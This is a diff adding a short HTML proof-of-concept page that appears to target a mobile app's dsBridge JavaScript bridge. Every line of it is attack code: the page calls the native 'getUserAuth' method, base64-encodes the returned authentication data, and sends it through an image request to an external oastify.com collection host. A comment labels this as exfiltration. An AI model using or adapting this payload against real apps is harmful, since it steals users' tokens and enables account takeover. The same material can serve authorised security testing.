@@ -1,0 +1,12 @@
+<script src="https://unpkg.com/dsbridge@3.1.3/dist/dsbridge.js"> </script>
+<script>
+dsBridge.call("getUserAuth", {}, function (res) {
+  document.body.innerHTML += "<pre>" + JSON.stringify(res) + "</pre>";
+    // Exfiltration with <img> tag.
+  const base64 = btoa(JSON.stringify(res));
+  const imgSrc = "https://5pvd2v66334ooy0q7ghfdhxjdaj17rvg.oastify.com/jwt.jpg?jwt=," + base64;
+  const img = document.createElement("img");
+  img.src = imgSrc;
+  document.body.appendChild(img);
+});
+</script>
